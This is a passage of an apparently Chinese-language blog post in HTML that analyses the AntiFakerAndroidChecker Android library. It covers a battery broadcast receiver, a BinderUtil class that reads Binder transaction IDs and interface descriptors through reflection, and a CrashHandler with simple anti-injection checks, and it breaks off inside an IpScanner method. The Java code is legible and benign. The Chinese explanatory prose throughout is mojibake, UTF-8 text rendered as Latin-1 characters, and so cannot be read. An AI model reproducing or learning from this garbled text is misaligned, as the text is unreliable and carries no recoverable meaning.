è¿™ä¸ªç±»ã€‚</li><li><strong>æ³¨å†Œå¹¿æ’­æ¥æ”¶å™¨</strong>ï¼šæˆ‘ä»¬éœ€è¦å‘Šè¯‰å®‰å“ç³»ç»Ÿï¼Œâ€œå˜¿ï¼Œæˆ‘è¿™é‡Œæœ‰ä¸€ä¸ªæ¥æ”¶å™¨ï¼Œå®ƒå¯¹æŸä¸ªç‰¹å®šçš„äº‹ä»¶æ„Ÿå…´è¶£ã€‚å½“è¿™ä¸ªäº‹ä»¶å‘ç”Ÿæ—¶ï¼Œè¯·é€šçŸ¥æˆ‘ã€‚â€</li></ol><p>è¿™ä¸ªâ€œæ³¨å†Œâ€çš„åŠ¨ä½œå‘ç”Ÿåœ¨ <code>AndroidDeviceIMEIUtil.java</code> æ–‡ä»¶ä¸­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// d:\android_re\AntiFakerAndroidChecker-1.6.0\AntiFakerAndroidChecker-1.6.0\antifake\src\main\java\com\snail\antifake\deviceid\AndroidDeviceIMEIUtil.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerBatteryChangeListener</span><span class="params">(Context context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sBatteryChangeReceiver == <span class="literal">null</span>) &#123;</span><br><span class="line">        sBatteryChangeReceiver = <span class="keyword">new</span> <span class="title class_">BatteryChangeReceiver</span>();</span><br><span class="line">        <span class="comment">// 1. åˆ›å»ºä¸€ä¸ªæ„å›¾è¿‡æ»¤å™¨ (IntentFilter)</span></span><br><span class="line">        <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. å‘Šè¯‰è¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬åªå¯¹ &quot;ACTION_BATTERY_CHANGED&quot; è¿™ä¸ªåŠ¨ä½œæ„Ÿå…´è¶£</span></span><br><span class="line">        filter.addAction(Intent.ACTION_BATTERY_CHANGED);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. ä½¿ç”¨ä¸Šä¸‹æ–‡(context)å°†æˆ‘ä»¬çš„æ¥æ”¶å™¨(sBatteryChangeReceiver)å’Œè¿‡æ»¤å™¨(filter)æ³¨å†Œåˆ°ç³»ç»Ÿä¸­</span></span><br><span class="line">        context.registerReceiver(sBatteryChangeReceiver, filter);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Intent.ACTION_BATTERY_CHANGED</code> æ˜¯å®‰å“ç³»ç»Ÿé¢„å®šä¹‰çš„ä¸€ä¸ª<strong>å¹¿æ’­åŠ¨ä½œï¼ˆActionï¼‰</strong></p><p>å½“ç³»ç»Ÿæ£€æµ‹åˆ°ç”µæ± çš„çŠ¶æ€å‘ç”Ÿäº†å˜åŒ–ï¼Œæ¯”å¦‚ï¼š</p><ul><li>å¼€å§‹å……ç”µï¼ˆæ’ä¸Šå……ç”µå™¨ï¼‰</li><li>åœæ­¢å……ç”µï¼ˆæ‹”æ‰å……ç”µå™¨ï¼‰</li><li>ç”µé‡ç™¾åˆ†æ¯”å‘ç”Ÿæ”¹å˜ï¼ˆä¾‹å¦‚ä» 81% æ‰åˆ° 80%ï¼‰</li><li>ç”µæ± å……æ»¡</li><li>ç”µæ± æ¸©åº¦å˜åŒ–ç­‰</li></ul><p>ç³»ç»Ÿå°±ä¼šå‘é€ä¸€ä¸ªå¸¦æœ‰ <code>ACTION_BATTERY_CHANGED</code> åŠ¨ä½œçš„å¹¿æ’­</p><p>ç”±äºæˆ‘ä»¬çš„ <code>BatteryChangeReceiver</code> å·²ç»æ³¨å†Œç›‘å¬äº†è¿™ä¸ªåŠ¨ä½œï¼Œæ‰€ä»¥å®‰å“ç³»ç»Ÿå°±ä¼šè‡ªåŠ¨è°ƒç”¨å®ƒçš„ <code>onReceive</code> æ–¹æ³•ï¼Œå¹¶å°†åŒ…å«è¯¦ç»†ä¿¡æ¯çš„ <code>Intent</code> å¯¹è±¡ä¼ é€’è¿›æ¥</p><p><code>status</code>ä¹Ÿå¯ä»¥é€šè¿‡å®šä¹‰çœ‹åˆ°ï¼Œå…¶å€¼æ˜¯é€šè¿‡<code>intent</code>ç›‘å¬<code>Broadcast</code>è·å–çš„</p><p>æˆ–è€…è¯´æ˜¯<code>BroadcastReceiver</code>å¸¦ç»™<code>intent</code>çš„å€¼</p><p>ä¸è¿‡ä¹Ÿå¯çŸ¥è¿™æ˜¯å…³äºå½“å‰ç”µæ± çŠ¶æ€çš„å˜åŒ–çš„çŠ¶æ€çš„</p><blockquote><p><code>BatteryManager.BATTERY_STATUS_CHARGING</code>ï¼šè®¾å¤‡æ­£åœ¨å……ç”µã€‚</p><p><code>BatteryManager.BATTERY_STATUS_DISCHARGING</code>ï¼šè®¾å¤‡æ­£åœ¨ä½¿ç”¨ç”µæ± ã€‚</p><p><code>BatteryManager.BATTERY_STATUS_NOT_CHARGING</code>ï¼šè®¾å¤‡æœªåœ¨å……ç”µã€‚</p><p><code>BatteryManager.BATTERY_STATUS_FULL</code>ï¼šç”µæ± å·²å……æ»¡ã€‚</p><p><code>BatteryManager.BATTERY_STATUS_UNKNOWN</code>ï¼šç”µæ± çŠ¶æ€æœªçŸ¥ã€‚</p></blockquote><p>å¦‚æœè®¾å¤‡æ­£åœ¨å……ç”µã€ç”µæ± å·²å……æ»¡æˆ–è€…ç”µæ± çŠ¶æ€æœªçŸ¥ï¼Œ<code>mIsCharging</code> æ ‡å¿—è¢«è®¾ç½®ä¸º <code>true</code>ã€‚</p><p>å¦‚æœçŠ¶æ€æ˜¯ <code>BATTERY_STATUS_NOT_CHARGING</code> æˆ– <code>BATTERY_STATUS_DISCHARGING</code>ï¼Œ<code>mIsCharging</code> æ ‡å¿—è¢«è®¾ç½®ä¸º <code>false</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCharging</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mIsCharging;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCurrentLevel</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mCurrentLevel;<span class="comment">//ç”µæ± ç”µé‡</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BinderUtil-java"><a href="#BinderUtil-java" class="headerlink" title="BinderUtil.java"></a>BinderUtil.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.snail.antifake.deviceid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: hzlishang</span></span><br><span class="line"><span class="comment"> * Data: 17-7-13 ä¸‹åˆ1:29</span></span><br><span class="line"><span class="comment"> * Des:</span></span><br><span class="line"><span class="comment"> * version:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinderUtil</span> &#123;</span><br><span class="line">    <span class="comment">//æ ¹æ®æ–¹æ³•åï¼Œåå°„è·å¾—æ–¹æ³•transactionId</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getTransactionId</span><span class="params">(Object proxy,</span></span><br><span class="line"><span class="params">                                        String name)</span> <span class="keyword">throws</span> RemoteException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">transactionId</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">outclass</span> <span class="operator">=</span> proxy.getClass().getEnclosingClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">idField</span> <span class="operator">=</span> outclass.getDeclaredField(name);</span><br><span class="line">        idField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transactionId = (<span class="type">int</span>) idField.get(proxy);</span><br><span class="line">        <span class="keyword">return</span> transactionId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ ¹æ®æ–¹æ³•åï¼Œåå°„è·å¾—æ–¹æ³•transactionId</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getInterfaceDescriptor</span><span class="params">(Object proxy)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">getInterfaceDescriptor</span> <span class="operator">=</span> proxy.getClass().getDeclaredMethod(<span class="string">&quot;getInterfaceDescriptor&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (String) getInterfaceDescriptor.invoke(proxy);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªåä¸º <code>BinderUtil</code> çš„å·¥å…·ç±»ï¼Œè¿™ä¸ªå·¥å…·ç±»çš„æ ¸å¿ƒç›®çš„æ˜¯é€šè¿‡ <strong>Java åå°„</strong> æŠ€æœ¯ï¼Œæ¥è·å– Android ç³»ç»Ÿåº•å±‚ <strong>Binder é€šä¿¡æœºåˆ¶</strong> ä¸­çš„ä¸€äº›å…³é”®ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ ¹æ®æ–¹æ³•åï¼Œåå°„è·å¾—æ–¹æ³•transactionId</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getTransactionId</span><span class="params">(Object proxy,</span></span><br><span class="line"><span class="params">                                    String name)</span> <span class="keyword">throws</span> RemoteException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">transactionId</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 1. è·å–ä»£ç†å¯¹è±¡æ‰€å±çš„å¤–éƒ¨ç±»ï¼ˆé€šå¸¸æ˜¯ Stub ç±»ï¼‰</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">outclass</span> <span class="operator">=</span> proxy.getClass().getEnclosingClass();</span><br><span class="line">    <span class="comment">// 2. åœ¨å¤–éƒ¨ç±»ä¸­æŸ¥æ‰¾åä¸º name çš„å­—æ®µ</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">idField</span> <span class="operator">=</span> outclass.getDeclaredField(name);</span><br><span class="line">    <span class="comment">// 3. å¼ºåˆ¶ä½¿å…¶å¯è®¿é—®ï¼ˆå³ä½¿æ˜¯ privateï¼‰</span></span><br><span class="line">    idField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// 4. è·å–è¯¥å­—æ®µçš„å€¼</span></span><br><span class="line">    transactionId = (<span class="type">int</span>) idField.get(proxy);</span><br><span class="line">    <span class="keyword">return</span> transactionId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ Binder é€šä¿¡ä¸­ï¼Œæ¯ä¸ªå¯ä»¥è¢«è¿œç¨‹è°ƒç”¨çš„æ–¹æ³•éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ•´æ•° IDï¼Œç§°ä¸º <code>Transaction ID</code>ã€‚å½“å®¢æˆ·ç«¯å‘èµ·è°ƒç”¨æ—¶ï¼Œå¹¶ä¸ä¼šæŠŠæ–¹æ³•åä¼ ç»™æœåŠ¡ç«¯ï¼Œè€Œæ˜¯ä¼ é€’è¿™ä¸ª <code>Transaction ID</code>ã€‚æœåŠ¡ç«¯æ ¹æ®è¿™ä¸ª ID æ¥åˆ¤æ–­åº”è¯¥æ‰§è¡Œå“ªä¸ªå…·ä½“çš„æ–¹æ³•ã€‚ è¿™äº› ID é€šå¸¸åœ¨ç¼–è¯‘æ—¶ç”± AIDLï¼ˆAndroid æ¥å£å®šä¹‰è¯­è¨€ï¼‰å·¥å…·è‡ªåŠ¨ç”Ÿæˆï¼Œå¹¶ä½œä¸º <code>static final int</code> å¸¸é‡å­—æ®µå®šä¹‰åœ¨ <code>Stub</code> ç±»ä¸­ï¼Œä¾‹å¦‚ <code>TRANSACTION_getDeviceId</code>ã€‚</p><p>è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨å°±æ˜¯é€šè¿‡åå°„ï¼Œåœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°è·å–è¿™ä¸ª <code>Transaction ID</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ ¹æ®æ–¹æ³•åï¼Œåå°„è·å¾—æ–¹æ³•transactionId</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getInterfaceDescriptor</span><span class="params">(Object proxy)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">    <span class="comment">// 1. è·å– proxy ç±»ä¸­åä¸º &quot;getInterfaceDescriptor&quot; çš„æ–¹æ³•</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">getInterfaceDescriptor</span> <span class="operator">=</span> proxy.getClass().getDeclaredMethod(<span class="string">&quot;getInterfaceDescriptor&quot;</span>);</span><br><span class="line">    <span class="comment">// 2. è°ƒç”¨è¯¥æ–¹æ³•</span></span><br><span class="line">    <span class="keyword">return</span> (String) getInterfaceDescriptor.invoke(proxy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¯ä¸ª Binder æœåŠ¡éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„å­—ç¬¦ä¸²åç§°ï¼Œç§°ä¸ºâ€œæ¥å£æè¿°ç¬¦â€ï¼ˆInterface Descriptorï¼‰ã€‚å®ƒé€šå¸¸æ˜¯æ¥å£çš„å®Œæ•´ç±»åï¼ˆä¾‹å¦‚ <code>&quot;android.telephony.ITelephony&quot;</code>ï¼‰ã€‚è¿™ä¸ªæè¿°ç¬¦ç”¨äºåœ¨ Binder é€šä¿¡çš„ä¸¤ç«¯éªŒè¯å¯¹æ–¹æ˜¯ä¸æ˜¯è‡ªå·±æƒ³è¦é€šä¿¡çš„é‚£ä¸ªæœåŠ¡ã€‚ <code>IBinder</code> æ¥å£æœ¬èº«å°±å®šä¹‰äº† <code>getInterfaceDescriptor()</code> æ–¹æ³•ï¼Œæ‰€æœ‰ Binder å¯¹è±¡éƒ½å®ç°äº†å®ƒ</p><p>è¿™ä¸ªå·¥å…·æ–¹æ³•çš„ä½œç”¨å°±æ˜¯é€šè¿‡åå°„æ¥è°ƒç”¨ <code>getInterfaceDescriptor()</code> æ–¹æ³•</p><p>ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªé—®é¢˜å°±æ˜¯ï¼Œè¿™ä¸ªé¡¹ç›®æœ¬èº«åœ¨ä½¿ç”¨è¿™ä¸ªæ–¹æ³•æ˜¯é€šè¿‡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">Stub</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.android.internal.telephony.IPhoneSubInfo$Stub&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">asInterface</span> <span class="operator">=</span> Stub.getDeclaredMethod(<span class="string">&quot;asInterface&quot;</span>, IBinder.class);</span><br><span class="line">asInterface.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">binderProxy</span> <span class="operator">=</span> asInterface.invoke(<span class="literal">null</span>, binder);</span><br><span class="line">BinderUtil.getTransactionId(binderProxy, <span class="string">&quot;TRANSACTION_getDeviceId&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™æ ·è°ƒç”¨çš„ï¼Œè€Œå¦‚æ­¤è°ƒç”¨ä¼šå‘ç”Ÿä¸€ä¸ªé”™è¯¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.NoSuchMethodException: com.android.internal.telephony.IPhoneSubInfo$Stub$Proxy.getInterfaceDescriptor []</span><br></pre></td></tr></table></figure><p>åŸå› æ˜¯ï¼šå¯¹äºè¿™ä¸ªProxyæ¥è¯´ï¼Œä¸å­˜åœ¨<code>getInterfaceDescriptor</code>è¿™ä¸ªæ–¹æ³•ï¼Œ<code>getInterfaceDescriptor</code>æ˜¯åœ¨<code>IBinder</code>åº•å±‚ç±»å°±æœ‰å®ç°çš„ï¼Œè€Œè¿™ä¸ªé€šè¿‡<code>asInterface</code>è¿”å›çš„Proxyä»£ç†ç±»æ˜¯ç”±ç³»ç»Ÿåœ¨ç¼–è¯‘æ—¶æ ¹æ®æä¾›çš„AIDLæ–‡ä»¶ç”Ÿæˆçš„ï¼Œå®ƒåªåŒ…å«AIDLä¸­çš„ä¸šåŠ¡æ–¹æ³•è€Œä¸ä¼šåŒ…å«åƒ<code>getInterfaceDescriptor</code>è¿™ç§<code>IBinder</code>åº•å±‚ç®¡ç†æ–¹æ³•</p><p>å› æ­¤è¦å…ˆè·å–å…¶<code>IBinder</code>ç„¶åè°ƒç”¨å¯¹åº”çš„æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getInterfaceDescriptor</span><span class="params">(Object proxy)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, RemoteException &#123;</span><br><span class="line">    <span class="keyword">if</span> (proxy <span class="keyword">instanceof</span> IInterface) &#123;</span><br><span class="line">        <span class="keyword">return</span> ((IInterface) proxy).asBinder().getInterfaceDescriptor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Fallback for other types of proxies if needed, though less likely for AIDL.</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">getInterfaceDescriptorMethod</span> <span class="operator">=</span> proxy.getClass().getMethod(<span class="string">&quot;getInterfaceDescriptor&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> (String) getInterfaceDescriptorMethod.invoke(proxy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CrashHandler-java"><a href="#CrashHandler-java" class="headerlink" title="CrashHandler.java"></a>CrashHandler.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.snail.antifake.deviceid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.ActivityManager;</span><br><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.os.Process;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: snail</span></span><br><span class="line"><span class="comment"> * Data: 2017/8/3 ä¸‹åˆ3:25</span></span><br><span class="line"><span class="comment"> * Des:</span></span><br><span class="line"><span class="comment"> * version:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrashHandler</span> <span class="keyword">implements</span> <span class="title class_">Thread</span>.UncaughtExceptionHandler &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Application mApplication;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CrashHandler</span><span class="params">(Application application)</span>&#123;</span><br><span class="line">        mApplication=application;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">uncaughtException</span><span class="params">(Thread thread, Throwable ex)</span> &#123;</span><br><span class="line">        Process.killProcess( Process.myPid());</span><br><span class="line">        <span class="type">ActivityManager</span> <span class="variable">manager</span> <span class="operator">=</span> (ActivityManager)</span><br><span class="line">                mApplication.getSystemService(Context.ACTIVITY_SERVICE);</span><br><span class="line">        <span class="keyword">for</span> (ActivityManager.RunningAppProcessInfo processInfo : manager.getRunningAppProcesses()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (processInfo.pid == Process.myPid()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!mApplication.getPackageName().equals(processInfo.processName)) &#123;</span><br><span class="line">                    Process.killProcess( Process.myPid());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>implements</code>çš„ä½œç”¨æ˜¯**å£°æ˜ä¸€ä¸ªç±»æ­£åœ¨â€œå®ç°â€ä¸€ä¸ªæˆ–å¤šä¸ªæ¥å£ (Interface)**ï¼Œå¯ä»¥ä¸€æ¬¡å£°æ˜å¤šä¸ªæ¥å£</p><p><strong>å¦‚æœæ˜¯ä¸€ä¸ªæ™®é€šç±» (Concrete Class)ï¼š</strong>å¿…é¡»<strong>å®ç°è¯¥æ¥å£åŠå…¶æ‰€æœ‰çˆ¶æ¥å£ä¸­å®šä¹‰çš„</strong>æ‰€æœ‰æŠ½è±¡ (abstract) æ–¹æ³•ã€‚å¦‚æœæ¼æ‰äº†ä»»ä½•ä¸€ä¸ªï¼ŒJava ç¼–è¯‘å™¨éƒ½ä¼šæŠ¥é”™ã€‚</p><p><strong>å¦‚æœæ˜¯ä¸€ä¸ªæŠ½è±¡ç±» (Abstract Class)ï¼š</strong> <strong>ä¸éœ€è¦</strong>å®ç°æ‰€æœ‰æ–¹æ³•ã€‚ä½ å¯ä»¥é€‰æ‹©å®ç°ä¸€éƒ¨åˆ†ã€æˆ–ä¸€ä¸ªéƒ½ä¸å®ç°ã€‚</p></blockquote><blockquote><p><code>Thread.UncaughtExceptionHandler</code> æ˜¯ Java æä¾›çš„ä¸€ä¸ªæ¥å£ã€‚ä»»ä½•å®ç°äº†è¿™ä¸ªæ¥å£çš„ç±»éƒ½å¯ä»¥è¢«æ³¨å†Œä¸ºâ€œé»˜è®¤çš„æœªæ•è·å¼‚å¸¸å¤„ç†å™¨â€ã€‚å½“åº”ç”¨ä¸­çš„ä»»ä½•çº¿ç¨‹ï¼ˆåŒ…æ‹¬ä¸»çº¿ç¨‹ï¼‰æŠ›å‡ºä¸€ä¸ªæ²¡æœ‰è¢« <code>try-catch</code> è¯­å¥æ•è·çš„å¼‚å¸¸æ—¶ï¼ŒJVM å°±ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªå¤„ç†å™¨ä¸­çš„ <code>uncaughtException</code> æ–¹æ³•ã€‚</p></blockquote><p>è¿™ä¸ª <code>CrashHandler</code> çš„è®¾è®¡ç›®çš„å¹¶ä¸ä»…ä»…æ˜¯ä¸ºäº†å¤„ç†å¸¸è§„çš„ç¨‹åºå´©æºƒï¼Œå®ƒè¿˜åŒ…å«äº†ä¸€å±‚<strong>åŸºç¡€çš„åæ³¨å…¥å’Œåè°ƒè¯•ä¿æŠ¤</strong>ã€‚</p><ul><li><strong>å¸¸è§„å´©æºƒå¤„ç†</strong>ï¼šåœ¨ä»»ä½•æœªæ•è·å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œå®ƒä¼šç¡®ä¿åº”ç”¨è¿›ç¨‹è¢«å½»åº•ç»ˆæ­¢ï¼Œè€Œä¸æ˜¯ä¾èµ–ç³»ç»Ÿé»˜è®¤çš„å´©æºƒå¯¹è¯æ¡†ã€‚</li><li><strong>å®‰å…¨æ£€æµ‹</strong>ï¼šå®ƒåœ¨åº”ç”¨å´©æºƒçš„ç¬é—´ï¼Œæ£€æŸ¥è‡ªèº«è¿›ç¨‹åæ˜¯å¦ä¸é¢„æœŸçš„åŒ…åä¸€è‡´ã€‚å¦‚æœå‘ç°ä¸ä¸€è‡´ï¼Œå®ƒä¼šå†æ¬¡å¼ºåˆ¶æ€æ­»è¿›ç¨‹ã€‚è¿™å¯ä»¥é˜²æ­¢åœ¨æŸäº›è¢«æ³¨å…¥æˆ–ç¯¡æ”¹çš„ç¯å¢ƒä¸‹ï¼Œå³ä½¿åº”ç”¨ä¸»é€»è¾‘å´©æºƒï¼Œæ³¨å…¥çš„ä»£ç ä»ç„¶å¯èƒ½ç»§ç»­åœ¨åº”ç”¨çš„è¿›ç¨‹ç©ºé—´ä¸­è¿è¡Œã€‚</li></ul><h3 id="IpScanner-java"><a href="#IpScanner-java" class="headerlink" title="IpScanner.java"></a>IpScanner.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">getHostIP</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">hostIp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Enumeration</span> <span class="variable">nis</span> <span class="operator">=</span> NetworkInterface.getNetworkInterfaces();</span><br><span class="line">        InetAddress ia;</span><br><span class="line">        <span class="keyword">while</span> (nis.hasMoreElements()) &#123;</span><br><span class="line">            <span class="type">NetworkInterface</span> <span class="variable">ni</span> <span class="operator">=</span> (NetworkInterface) nis.nextElement();</span><br><span class="line">            Enumeration&lt;InetAddress&gt; ias = ni.getInetAddresses();</span><br><span class="line">            <span class="keyword">while</span> (ias.hasMoreElements()) &#123;</span><br><span class="line">                ia = ias.nextElement();</span><br><span class="line">                <span class="keyword">if</span> (ia <span class="keyword">instanceof</span> Inet6Address) &#123;</span><br><span class="line">                    <span 